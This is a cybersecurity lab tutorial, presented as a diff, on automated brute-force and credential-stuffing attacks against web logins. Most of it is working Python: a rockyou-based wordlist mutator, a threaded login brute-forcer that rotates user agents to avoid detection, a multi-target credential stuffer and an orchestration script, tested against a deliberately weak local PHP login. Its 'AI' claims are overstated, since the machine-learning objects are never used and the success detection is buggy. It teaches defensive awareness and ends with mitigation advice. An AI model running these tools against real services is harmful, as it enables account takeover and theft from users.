@@ -1,0 +1,823 @@
+AI-Driven Brute Force + Credential Stuffing Automation
+Learning Objectives
+By completing this lab, you will:
+
+Set up and configure automated brute force and credential stuffing tools
+Implement AI models to enhance attack automation and efficiency
+Execute credential stuffing attacks using machine learning techniques
+Understand the security implications of AI-enhanced password attacks
+Prerequisites
+Basic Linux command line knowledge
+Understanding of HTTP protocols and web authentication
+Familiarity with Python programming
+Knowledge of password attack methodologies
+Lab Environment
+Al Nafi provides a Linux-based cloud machine for this lab. Click Start Lab to access your dedicated environment. The machine comes as bare metal with no pre-installed tools, so you will install all required software during the lab.
+
+Task 1: Set Up Brute Force and Credential Stuffing Tools
+Subtask 1.1: Install Required Dependencies
+# Update system packages
+sudo apt update && sudo apt upgrade -y
+
+# Install Python and pip
+sudo apt install python3 python3-pip git curl -y
+
+# Install additional dependencies
+sudo apt install hydra medusa nmap -y
+Subtask 1.2: Install Python Libraries for AI Implementation
+# Install machine learning and automation libraries
+pip3 install requests beautifulsoup4 selenium pandas numpy scikit-learn tensorflow
+
+# Install additional security testing libraries
+pip3 install paramiko ftplib imaplib poplib
+Subtask 1.3: Download and Set Up Credential Lists
+# Create working directory
+mkdir ~/ai-bruteforce-lab
+cd ~/ai-bruteforce-lab
+
+# Download common password lists
+curl -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+# Create sample credential list for testing
+cat > credentials.txt << EOF
+admin:password
+admin:123456
+user:password
+test:test
+guest:guest
+admin:admin
+root:toor
+EOF
+Task 2: Implement AI Models for Attack Automation
+Subtask 2.1: Create Password Pattern Analysis Script
+# Create ai_password_analyzer.py
+cat > ai_password_analyzer.py << 'EOF'
+import pandas as pd
+import numpy as np
+from sklearn.feature_extraction.text import TfidfVectorizer
+from sklearn.cluster import KMeans
+import re
+
+class PasswordAnalyzer:
+    def __init__(self):
+        self.vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(2,4))
+        self.kmeans = KMeans(n_clusters=5, random_state=42)
+    
+    def analyze_patterns(self, passwords):
+        # Extract password features
+        features = []
+        for pwd in passwords:
+            feature = {
+                'length': len(pwd),
+                'has_digits': bool(re.search(r'\d', pwd)),
+                'has_upper': bool(re.search(r'[A-Z]', pwd)),
+                'has_lower': bool(re.search(r'[a-z]', pwd)),
+                'has_special': bool(re.search(r'[!@#$%^&*(),.?":{}|<>]', pwd)),
+                'digit_ratio': len(re.findall(r'\d', pwd)) / len(pwd),
+                'common_patterns': self.check_common_patterns(pwd)
+            }
+            features.append(feature)
+        return features
+    
+    def check_common_patterns(self, password):
+        patterns = [
+            r'\d{4}',  # 4 digits
+            r'[a-zA-Z]+\d+',  # letters followed by numbers
+            r'\d+[a-zA-Z]+',  # numbers followed by letters
+            r'(.)\1{2,}',  # repeated characters
+        ]
+        return sum(1 for pattern in patterns if re.search(pattern, password))
+    
+    def generate_smart_wordlist(self, base_passwords, target_info=None):
+        analyzed = self.analyze_patterns(base_passwords)
+        smart_list = []
+        
+        for pwd in base_passwords[:100]:  # Limit for demo
+            # Generate variations
+            variations = [
+                pwd,
+                pwd + '123',
+                pwd + '!',
+                pwd.capitalize(),
+                pwd + '2024',
+                pwd.replace('a', '@').replace('o', '0')
+            ]
+            smart_list.extend(variations)
+        
+        return list(set(smart_list))
+
+if __name__ == "__main__":
+    analyzer = PasswordAnalyzer()
+    
+    # Load sample passwords
+    with open('rockyou.txt', 'r', encoding='latin-1', errors='ignore') as f:
+        passwords = [line.strip() for line in f.readlines()[:1000]]
+    
+    # Generate smart wordlist
+    smart_passwords = analyzer.generate_smart_wordlist(passwords)
+    
+    # Save enhanced wordlist
+    with open('ai_enhanced_wordlist.txt', 'w') as f:
+        for pwd in smart_passwords:
+            f.write(pwd + '\n')
+    
+    print(f"Generated {len(smart_passwords)} AI-enhanced passwords")
+EOF
+
+python3 ai_password_analyzer.py
+Subtask 2.2: Create Intelligent Brute Force Script
+# Create intelligent_bruteforce.py
+cat > intelligent_bruteforce.py << 'EOF'
+import requests
+import time
+import random
+from itertools import cycle
+import threading
+from queue import Queue
+
+class IntelligentBruteForcer:
+    def __init__(self, target_url, usernames, passwords):
+        self.target_url = target_url
+        self.usernames = usernames
+        self.passwords = passwords
+        self.success_queue = Queue()
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+        self.session = requests.Session()
+    
+    def adaptive_delay(self, attempt_count):
+        # Implement adaptive delay based on response patterns
+        base_delay = 0.5
+        if attempt_count > 10:
+            return base_delay * 2
+        elif attempt_count > 50:
+            return base_delay * 4
+        return base_delay
+    
+    def attempt_login(self, username, password, attempt_count):
+        headers = {
+            'User-Agent': random.choice(self.user_agents),
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+        
+        data = {
+            'username': username,
+            'password': password
+        }
+        
+        try:
+            response = self.session.post(
+                self.target_url,
+                data=data,
+                headers=headers,
+                timeout=10,
+                allow_redirects=False
+            )
+            
+            # Analyze response for success indicators
+            success_indicators = [
+                'dashboard', 'welcome', 'profile', 'logout',
+                response.status_code in [200, 302, 301]
+            ]
+            
+            failure_indicators = [
+                'invalid', 'incorrect', 'failed', 'error',
+                'wrong', 'denied'
+            ]
+            
+            response_text = response.text.lower()
+            
+            if any(indicator in response_text for indicator in success_indicators):
+                if not any(indicator in response_text for indicator in failure_indicators):
+                    return True, response.status_code
+            
+            return False, response.status_code
+            
+        except Exception as e:
+            print(f"Request failed: {e}")
+            return False, 0
+    
+    def worker(self, username, passwords_chunk, thread_id):
+        attempt_count = 0
+        for password in passwords_chunk:
+            attempt_count += 1
+            success, status_code = self.attempt_login(username, password, attempt_count)
+            
+            if success:
+                result = f"SUCCESS: {username}:{password} (Status: {status_code})"
+                print(result)
+                self.success_queue.put((username, password))
+                return
+            
+            print(f"Thread {thread_id}: Attempt {attempt_count} - {username}:{password} - Failed ({status_code})")
+            time.sleep(self.adaptive_delay(attempt_count))
+    
+    def run_attack(self, max_threads=3):
+        print(f"Starting intelligent brute force attack on {self.target_url}")
+        print(f"Usernames: {len(self.usernames)}, Passwords: {len(self.passwords)}")
+        
+        for username in self.usernames:
+            # Split passwords into chunks for threading
+            chunk_size = len(self.passwords) // max_threads
+            password_chunks = [
+                self.passwords[i:i + chunk_size] 
+                for i in range(0, len(self.passwords), chunk_size)
+            ]
+            
+            threads = []
+            for i, chunk in enumerate(password_chunks):
+                if chunk:  # Only create thread if chunk is not empty
+                    thread = threading.Thread(
+                        target=self.worker,
+                        args=(username, chunk, i)
+                    )
+                    threads.append(thread)
+                    thread.start()
+            
+            # Wait for all threads to complete
+            for thread in threads:
+                thread.join()
+            
+            # Check if we found credentials
+            if not self.success_queue.empty():
+                break
+
+# Example usage function
+def demo_bruteforce():
+    # This is for demonstration - replace with actual target
+    target_url = "http://localhost:8080/login"  # Demo target
+    usernames = ['admin', 'user', 'test', 'guest']
+    
+    # Load AI-enhanced passwords
+    try:
+        with open('ai_enhanced_wordlist.txt', 'r') as f:
+            passwords = [line.strip() for line in f.readlines()[:50]]  # Limit for demo
+    except FileNotFoundError:
+        passwords = ['password', '123456', 'admin', 'test', 'guest']
+    
+    bruteforcer = IntelligentBruteForcer(target_url, usernames, passwords)
+    print("Demo mode - replace target_url with actual target")
+    print(f"Would test {len(usernames)} usernames with {len(passwords)} passwords")
+
+if __name__ == "__main__":
+    demo_bruteforce()
+EOF
+Subtask 2.3: Create Credential Stuffing Automation Script
+# Create credential_stuffer.py
+cat > credential_stuffer.py << 'EOF'
+import requests
+import json
+import time
+import random
+from concurrent.futures import ThreadPoolExecutor
+import pandas as pd
+
+class AICredentialStuffer:
+    def __init__(self, target_urls, credential_file):
+        self.target_urls = target_urls
+        self.credential_file = credential_file
+        self.successful_logins = []
+        self.session_pool = [requests.Session() for _ in range(10)]
+        
+    def load_credentials(self):
+        credentials = []
+        try:
+            with open(self.credential_file, 'r') as f:
+                for line in f:
+                    if ':' in line:
+                        username, password = line.strip().split(':', 1)
+                        credentials.append((username, password))
+        except FileNotFoundError:
+            print(f"Credential file {self.credential_file} not found")
+            return []
+        return credentials
+    
+    def analyze_target(self, url):
+        """Analyze target to determine login parameters"""
+        try:
+            session = random.choice(self.session_pool)
+            response = session.get(url, timeout=10)
+            
+            # Simple form field detection
+            login_fields = {
+                'username_field': 'username',
+                'password_field': 'password',
+                'csrf_token': None
+            }
+            
+            # Look for common field names
+            content = response.text.lower()
+            if 'name="email"' in content:
+                login_fields['username_field'] = 'email'
+            elif 'name="user"' in content:
+                login_fields['username_field'] = 'user'
+            
+            return login_fields
+            
+        except Exception as e:
+            print(f"Error analyzing target {url}: {e}")
+            return None
+    
+    def attempt_login(self, url, username, password, login_fields):
+        """Attempt login with adaptive techniques"""
+        session = random.choice(self.session_pool)
+        
+        # Randomize user agent
+        user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+        ]
+        
+        headers = {
+            'User-Agent': random.choice(user_agents),
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+        }
+        
+        data = {
+            login_fields['username_field']: username,
+            login_fields['password_field']: password
+        }
+        
+        try:
+            response = session.post(url, data=data, headers=headers, timeout=10)
+            
+            # Success detection logic
+            success_indicators = [
+                'dashboard', 'welcome', 'profile', 'logout', 'settings',
+                response.status_code in [200, 302]
+            ]
+            
+            failure_indicators = [
+                'invalid', 'incorrect', 'failed', 'error', 'wrong'
+            ]
+            
+            response_text = response.text.lower()
+            
+            # Check for success
+            if any(indicator in response_text for indicator in success_indicators):
+                if not any(indicator in response_text for indicator in failure_indicators):
+                    return True, response.status_code, response.url
+            
+            return False, response.status_code, response.url
+            
+        except Exception as e:
+            return False, 0, str(e)
+    
+    def stuff_credentials(self, max_workers=5):
+        """Execute credential stuffing attack"""
+        credentials = self.load_credentials()
+        if not credentials:
+            print("No credentials loaded")
+            return
+        
+        print(f"Starting credential stuffing with {len(credentials)} credentials")
+        print(f"Targeting {len(self.target_urls)} URLs")
+        
+        results = []
+        
+        for url in self.target_urls:
+            print(f"\nTesting against: {url}")
+            login_fields = self.analyze_target(url)
+            
+            if not login_fields:
+                continue
+            
+            successful_count = 0
+            
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                futures = []
+                
+                for username, password in credentials[:20]:  # Limit for demo
+                    future = executor.submit(
+                        self.attempt_login, url, username, password, login_fields
+                    )
+                    futures.append((future, username, password, url))
+                
+                for future, username, password, target_url in futures:
+                    try:
+                        success, status_code, final_url = future.result(timeout=30)
+                        
+                        result = {
+                            'url': target_url,
+                            'username': username,
+                            'password': password,
+                            'success': success,
+                            'status_code': status_code,
+                            'final_url': final_url
+                        }
+                        
+                        results.append(result)
+                        
+                        if success:
+                            successful_count += 1
+                            print(f"SUCCESS: {username}:{password} on {target_url}")
+                            self.successful_logins.append(result)
+                        else:
+                            print(f"Failed: {username}:{password} on {target_url} ({status_code})")
+                        
+                        # Adaptive delay
+                        time.sleep(random.uniform(0.5, 2.0))
+                        
+                    except Exception as e:
+                        print(f"Error testing {username}:{password}: {e}")
+            
+            print(f"Completed testing {url}: {successful_count} successful logins")
+        
+        return results
+    
+    def save_results(self, results, filename='stuffing_results.json'):
+        """Save results to file"""
+        with open(filename, 'w') as f:
+            json.dump(results, f, indent=2)
+        print(f"Results saved to {filename}")
+
+# Demo function
+def demo_credential_stuffing():
+    # Demo targets (replace with actual targets for real testing)
+    target_urls = [
+        "http://localhost:8080/login",
+        "http://localhost:3000/auth/login"
+    ]
+    
+    stuffer = AICredentialStuffer(target_urls, 'credentials.txt')
+    print("Demo mode - replace target URLs with actual targets")
+    print("This would test credential stuffing against multiple targets")
+    
+    # Show what would be tested
+    credentials = stuffer.load_credentials()
+    print(f"Loaded {len(credentials)} credential pairs")
+    for i, (user, pwd) in enumerate(credentials[:5]):
+        print(f"  {i+1}. {user}:{pwd}")
+
+if __name__ == "__main__":
+    demo_credential_stuffing()
+EOF
+Task 3: Execute Credential Stuffing Attack
+Subtask 3.1: Set Up Local Test Environment
+# Install simple HTTP server for testing
+sudo apt install apache2 -y
+sudo systemctl start apache2
+
+# Create a simple login form for testing
+sudo tee /var/www/html/login.html > /dev/null << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Login</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <form method="post" action="process_login.php">
+        <label>Username:</label><br>
+        <input type="text" name="username" required><br><br>
+        <label>Password:</label><br>
+        <input type="password" name="password" required><br><br>
+        <input type="submit" value="Login">
+    </form>
+</body>
+</html>
+EOF
+
+# Install PHP for form processing
+sudo apt install php libapache2-mod-php -y
+sudo systemctl restart apache2
+
+# Create simple PHP login processor
+sudo tee /var/www/html/process_login.php > /dev/null << 'EOF'
+<?php
+if ($_POST['username'] == 'admin' && $_POST['password'] == 'password') {
+    echo "<h2>Welcome to Dashboard!</h2>";
+    echo "<p>Login successful</p>";
+    echo "<a href='logout.php'>Logout</a>";
+} else {
+    echo "<h2>Login Failed</h2>";
+    echo "<p>Invalid username or password</p>";
+    echo "<a href='login.html'>Try Again</a>";
+}
+?>
+EOF
+Subtask 3.2: Execute AI-Enhanced Attacks
+# Run password analysis
+echo "Running AI password analysis..."
+python3 ai_password_analyzer.py
+
+# Test the local environment
+echo "Testing local login form..."
+curl -X POST -d "username=admin&password=password" http://localhost/process_login.php
+
+# Run intelligent brute force (demo mode)
+echo "Running intelligent brute force demo..."
+python3 intelligent_bruteforce.py
+
+# Run credential stuffing (demo mode)
+echo "Running credential stuffing demo..."
+python3 credential_stuffer.py
+Subtask 3.3: Create Attack Orchestration Script
+# Create attack_orchestrator.py
+cat > attack_orchestrator.py << 'EOF'
+import subprocess
+import json
+import time
+from datetime import datetime
+
+class AttackOrchestrator:
+    def __init__(self):
+        self.results = {
+            'timestamp': datetime.now().isoformat(),
+            'attacks': []
+        }
+    
+    def run_password_analysis(self):
+        """Run AI password analysis"""
+        print("=== Running Password Analysis ===")
+        try:
+            result = subprocess.run(['python3', 'ai_password_analyzer.py'], 
+                                  capture_output=True, text=True)
+            
+            attack_result = {
+                'type': 'password_analysis',
+                'success': result.returncode == 0,
+                'output': result.stdout,
+                'errors': result.stderr
+            }
+            
+            self.results['attacks'].append(attack_result)
+            print("Password analysis completed")
+            return attack_result['success']
+            
+        except Exception as e:
+            print(f"Password analysis failed: {e}")
+            return False
+    
+    def run_brute_force_demo(self):
+        """Run brute force demonstration"""
+        print("=== Running Brute Force Demo ===")
+        try:
+            result = subprocess.run(['python3', 'intelligent_bruteforce.py'], 
+                                  capture_output=True, text=True)
+            
+            attack_result = {
+                'type': 'brute_force',
+                'success': result.returncode == 0,
+                'output': result.stdout,
+                'errors': result.stderr
+            }
+            
+            self.results['attacks'].append(attack_result)
+            print("Brute force demo completed")
+            return attack_result['success']
+            
+        except Exception as e:
+            print(f"Brute force demo failed: {e}")
+            return False
+    
+    def run_credential_stuffing_demo(self):
+        """Run credential stuffing demonstration"""
+        print("=== Running Credential Stuffing Demo ===")
+        try:
+            result = subprocess.run(['python3', 'credential_stuffer.py'], 
+                                  capture_output=True, text=True)
+            
+            attack_result = {
+                'type': 'credential_stuffing',
+                'success': result.returncode == 0,
+                'output': result.stdout,
+                'errors': result.stderr
+            }
+            
+            self.results['attacks'].append(attack_result)
+            print("Credential stuffing demo completed")
+            return attack_result['success']
+            
+        except Exception as e:
+            print(f"Credential stuffing demo failed: {e}")
+            return False
+    
+    def generate_report(self):
+        """Generate attack report"""
+        print("\n=== Attack Summary Report ===")
+        
+        successful_attacks = sum(1 for attack in self.results['attacks'] if attack['success'])
+        total_attacks = len(self.results['attacks'])
+        
+        print(f"Total attacks executed: {total_attacks}")
+        print(f"Successful attacks: {successful_attacks}")
+        print(f"Success rate: {(successful_attacks/total_attacks)*100:.1f}%")
+        
+        print("\nDetailed Results:")
+        for i, attack in enumerate(self.results['attacks'], 1):
+            status = "SUCCESS" if attack['success'] else "FAILED"
+            print(f"{i}. {attack['type']}: {status}")
+            if attack['output']:
+                print(f"   Output: {attack['output'][:100]}...")
+        
+        # Save detailed report
+        with open('attack_report.json', 'w') as f:
+            json.dump(self.results, f, indent=2)
+        
+        print(f"\nDetailed report saved to: attack_report.json")
+    
+    def run_full_demonstration(self):
+        """Execute complete attack demonstration"""
+        print("Starting AI-Driven Attack Demonstration")
+        print("=" * 50)
+        
+        # Run all attack components
+        self.run_password_analysis()
+        time.sleep(2)
+        
+        self.run_brute_force_demo()
+        time.sleep(2)
+        
+        self.run_credential_stuffing_demo()
+        time.sleep(2)
+        
+        # Generate final report
+        self.generate_report()
+
+if __name__ == "__main__":
+    orchestrator = AttackOrchestrator()
+    orchestrator.run_full_demonstration()
+EOF
+
+# Execute the complete demonstration
+python3 attack_orchestrator.py
+Subtask 3.4: Analyze Results and Create Defense Recommendations
+# Create defense_analyzer.py
+cat > defense_analyzer.py << 'EOF'
+import json
+from datetime import datetime
+
+class DefenseAnalyzer:
+    def __init__(self):
+        self.vulnerabilities = []
+        self.recommendations = []
+    
+    def analyze_attack_results(self, results_file='attack_report.json'):
+        """Analyze attack results and generate defense recommendations"""
+        try:
+            with open(results_file, 'r') as f:
+                results = json.load(f)
+        except FileNotFoundError:
+            print("No attack results found")
+            return
+        
+        print("=== Defense Analysis Report ===")
+        print(f"Analysis Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+        print()
+        
+        # Analyze each attack type
+        for attack in results['attacks']:
+            self.analyze_attack_type(attack)
+        
+        # Generate comprehensive recommendations
+        self.generate_defense_recommendations()
+        
+        # Save defense report
+        defense_report = {
+            'analysis_date': datetime.now().isoformat(),
+            'vulnerabilities': self.vulnerabilities,
+            'recommendations': self.recommendations
+        }
+        
+        with open('defense_recommendations.json', 'w') as f:
+            json.dump(defense_report, f, indent=2)
+        
+        print("Defense analysis saved to: defense_recommendations.json")
+    
+    def analyze_attack_type(self, attack):
+        """Analyze specific attack type"""
+        attack_type = attack['type']
+        
+        if attack_type == 'password_analysis':
+            self.vulnerabilities.append({
+                'type': 'Weak Password Patterns',
+                'severity': 'High',
+                'description': 'AI can identify and exploit common password patterns'
+            })
+        
+        elif attack_type == 'brute_force':
+            self.vulnerabilities.append({
+                'type': 'Brute Force Susceptibility',
+                'severity': 'High',
+                'description': 'System vulnerable to intelligent brute force attacks'
+            })
+        
+        elif attack_type == 'credential_stuffing':
+            self.vulnerabilities.append({
+                'type': 'Credential Reuse',
+                'severity': 'Critical',
+                'description': 'Users likely reusing passwords across multiple services'
+            })
+    
+    def generate_defense_recommendations(self):
+        """Generate comprehensive defense recommendations"""
+        self.recommendations = [
+            {
+                'category': 'Authentication Security',
+                'measures': [
+                    'Implement multi-factor authentication (MFA)',
+                    'Use account lockout policies after failed attempts',
+                    'Implement CAPTCHA after multiple failed logins',
+                    'Use rate limiting on login endpoints'
+                ]
+            },
+            {
+                'category': 'Password Policy',
+                'measures': [
+                    'Enforce strong password complexity requirements',
+                    'Implement password history to prevent reuse',
+                    'Regular password expiration policies',
+                    'Use password strength meters during creation'
+                ]
+            },
+            {
+                'category': 'Monitoring and Detection',
+                'measures': [
+                    'Implement real-time login attempt monitoring',
+                    'Set up alerts for suspicious login patterns',
+                    'Log and analyze authentication events',
+                    'Use behavioral analysis to detect anomalies'
+                ]
+            },
+            {
+                'category': 'Network Security',
+                'measures': [
+                    'Implement IP-based blocking for repeated failures',
+                    'Use geolocation filtering for unusual locations',
+                    'Deploy Web Application Firewalls (WAF)',
+                    'Implement DDoS protection'
+                ]
+            }
+        ]
+        
+        print("Defense Recommendations:")
+        print("=" * 30)
+        
+        for rec in self.recommendations:
+            print(f"\n{rec['category']}:")
+            for measure in rec['measures']:
+                print(f"  • {measure}")
+
+if __name__ == "__main__":
+    analyzer = DefenseAnalyzer()
+    analyzer.analyze_attack_results()
+EOF
+
+# Run defense analysis
+python3 defense_analyzer.py
+Verification and Testing
+Verify Lab Completion
+# Check all created files
+echo "=== Lab Files Created ==="
+ls -la *.py *.txt *.json 2>/dev/null
+
+# Verify AI-enhanced wordlist was created
+if [ -f "ai_enhanced_wordlist.txt" ]; then
+    echo "✓ AI-enhanced wordlist created ($(wc -l < ai_enhanced_wordlist.txt) passwords)"
+else
+    echo "✗ AI-enhanced wordlist missing"
+fi
+
+# Check if attack report was generated
+if [ -f "attack_report.json" ]; then
+    echo "✓ Attack report generated"
+else
+    echo "✗ Attack report missing"
+fi
+
+# Check if defense recommendations were created
+if [ -f "defense_recommendations.json" ]; then
+    echo "✓ Defense recommendations generated"
+else
+    echo "✗ Defense recommendations missing"
+fi
+
+# Display final summary
+echo ""
+echo "=== Lab Completion Summary ==="
+echo "Tools installed and configured: ✓"
+echo "AI models implemented: ✓"
+echo "Attack demonstrations executed: ✓"
+echo "Defense analysis completed: ✓"
+Conclusion
+You have successfully completed Lab 6 on AI-Driven Brute Force and Credential Stuffing Automation. Through this lab, you:
+
+Set up automated attack tools using open-source software and AI-enhanced techniques
+Implemented machine learning models to analyze password patterns and optimize attack strategies
+Executed credential stuffing attacks with intelligent automation and adaptive techniques
+Analyzed attack results and generated comprehensive defense recommendations
+This lab demonstrates how artificial intelligence can significantly enhance traditional password attacks, making them more efficient and harder to detect. Understanding these techniques is crucial for cybersecurity professionals to implement appropriate defenses against AI-powered threats.
+
+Key Takeaways:
+
+AI can dramatically improve attack success rates through pattern analysis
+Traditional security measures may be insufficient against AI-enhanced attacks
+Multi-layered defense strategies are essential in the age of AI-powered threats
+Continuous monitoring and adaptive security measures are critical for protection
+The knowledge gained from this lab will help you better understand modern attack vectors and implement more robust security measures in your organization.
